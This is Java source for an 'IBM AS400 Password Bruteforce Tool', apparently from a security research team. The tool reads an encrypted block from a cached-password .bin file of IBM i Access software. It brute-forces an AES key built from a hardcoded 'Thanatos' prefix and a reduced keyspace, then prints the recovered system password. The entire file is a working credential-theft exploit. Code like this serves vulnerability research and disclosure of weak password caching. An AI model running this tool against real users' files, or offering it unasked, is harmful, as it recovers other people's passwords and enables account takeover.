// Your First Program
import javax.crypto.Cipher;
import java.security.*;
import javax.crypto.*;
import javax.crypto.spec.*;
import java.util.*;
import java.io.*;

class HelloWorld {
  public static boolean bytesArrayStartsWith(byte[] haystack, byte[] needle) {
    for (int i = 0; i < needle.length; i++) {
		if(haystack[i] != needle[i]){
			return false;
		}
    }
	return true;
  }
	public static void printBytes(byte[] encryptedBytes, int bytesRead){
		  for (int i = 0; i < bytesRead; i++) {
				System.out.print(String.format("%02X ", encryptedBytes[i]));
			}
	}
    public static void main(String[] args) {
	  	//String magicCookieStr = "com.ibm.iaccess.base.AcsPasswordCache";
	  	String magicCookieStr = "IBM Corporation Rochester";
		String passwordCandidate = "";
		byte[] encryptedBytes = new byte[0x30];
		byte[] MAGIC_COOKIE_PREFIX = magicCookieStr.getBytes();
		int bytesRead=0;
		System.out.println("\nIBM AS400 Password Bruteforce Tool v0.3 by Michał Majchrowicz AFINE Team\n");
		if(args.length < 3){
			System.out.println("Usage: java as400_password_bruteforce_tool.java <input_file.bin> <OS> <username> <pwd>\n");
			System.exit(-1);
		}
		String username = args[2];
		String osname = args[1];
		String pwd = args[3];
		String fullKeySpace = username+osname+pwd+"/home/"+username+"Behemoth";
		System.out.println("\033[35mFull keyspace: " + fullKeySpace);
		System.out.println("Full keyspace length: " + fullKeySpace.length()+"\n");
		char[] keyspaceChars = fullKeySpace.toCharArray();
		char[] reducedKeyspaceChars={'B'};
		for(int i=0;i<keyspaceChars.length;i++){
			if(!(new String(reducedKeyspaceChars).contains(String.valueOf(keyspaceChars[i])))) {
				reducedKeyspaceChars=(new String(reducedKeyspaceChars) + String.valueOf(keyspaceChars[i])).toCharArray();
			}
		}
		//char[] passChars=("th" + new String(reducedKeyspaceChars)).toCharArray();
		char[] passChars=reducedKeyspaceChars;
		System.out.println("\033[36mReduced keyspace: " + new String(reducedKeyspaceChars));
		//System.out.println("Fixed Reduced keyspace: " + new String(passChars));
		System.out.println("Reduced keyspace length: " + reducedKeyspaceChars.length+"\033[0m\n");
		try(FileInputStream fis = new FileInputStream(args[0])) {
			  fis.skip(0x194);
			  bytesRead=fis.read(encryptedBytes);
		  	  System.out.println("Read " + bytesRead + " bytes: \033[33m");
			  printBytes(encryptedBytes,bytesRead);
			  System.out.println("\033[0m");
		} catch(Exception exception){
			System.out.println("FS Exception: " +exception);
		}
		int maxPow=(int)Math.pow(passChars.length,8);
        int length = 8;
        char[] password_buffer = new char[length];
		for(int i0=0;i0<passChars.length;i0++){
			password_buffer[0]=passChars[i0];
			for(int i1=0;i1<passChars.length;i1++){
				password_buffer[1]=passChars[i1];
				for(int i2=0;i2<passChars.length;i2++){
					password_buffer[2]=passChars[i2];
					for(int i3=0;i3<passChars.length;i3++){
						password_buffer[3]=passChars[i3];
						for(int i4=0;i4<passChars.length;i4++){
							password_buffer[4]=passChars[i4];
							for(int i5=0;i5<passChars.length;i5++){
								password_buffer[5]=passChars[i5];
								for(int i6=0;i6<passChars.length;i6++){
									password_buffer[6]=passChars[i6];
									for(int i7=0;i7<passChars.length;i7++){
										password_buffer[7]=passChars[i7];
										try{
											passwordCandidate = "Thanatos" + new String(password_buffer);
											SecretKeySpec secretKeySpec = new SecretKeySpec(passwordCandidate.getBytes(), "AES");
											Cipher cipher = Cipher.getInstance("AES");
											cipher.init(Cipher.DECRYPT_MODE, secretKeySpec); //decrypt
											byte[] decryptedBytes = cipher.doFinal(encryptedBytes); //System.out.println("\rDecrypted " + decryptedBytes.length + " bytes:\033[31m                       ");
											//printBytes(decryptedBytes,decryptedBytes.length);
											//String decryptedString2=new String(decryptedBytes);
											//System.out.println("\033[32mDecrypted data: " + decryptedString2);
											//System.exit(-1);
											if(bytesArrayStartsWith(decryptedBytes,MAGIC_COOKIE_PREFIX)){
		  	  									System.out.println("\rDecrypted " + decryptedBytes.length + " bytes:\033[31m                       ");
												printBytes(decryptedBytes,decryptedBytes.length);
												System.out.println("\n\n\033[32mFound good pass: " + passwordCandidate);
												String decryptedString=new String(decryptedBytes);
												System.out.println("\033[32mDecrypted data: " + decryptedString);
												System.out.println("\033[32mSystem password: " + decryptedString.replace(magicCookieStr,"")+"\033[0m\n");
												System.exit(0);
												break;
											}

										} catch (Exception exception){
											System.out.print("Exception: "+exception);
										}
									}
								}
							}
						}
						System.out.print("\r\033[33mPass: "+passwordCandidate+"\033[0m"); 
					}
				}
			}
		}
	}
}
